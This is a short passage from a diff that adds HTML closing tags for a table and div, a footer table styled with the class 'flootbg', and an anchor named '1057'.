+                </td>
+            </tr>
+        </tbody></table>
+	</div>
+	<table width="100%" class="flootbg"><tbody><tr><td>
+	</td></tr></tbody></table>
+	<a name="1057"></a>
